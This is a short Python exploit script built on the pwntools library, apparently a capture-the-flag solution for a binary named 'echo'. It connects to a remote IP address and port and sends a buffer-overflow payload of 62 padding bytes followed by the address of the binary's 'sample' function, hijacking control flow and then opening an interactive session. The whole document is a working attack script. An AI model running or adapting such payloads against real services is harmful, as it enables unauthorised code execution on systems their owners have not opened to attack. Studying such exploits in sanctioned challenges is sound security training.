from pwn import *

#sh=process('./echo')
sh=remote('111.198.29.45','32550')
elf = ELF('./echo')
pay='a'*62+p32(elf.symbols['sample'])
sh.sendline(pay)
#gdb.attach(sh)
sh.interactive()
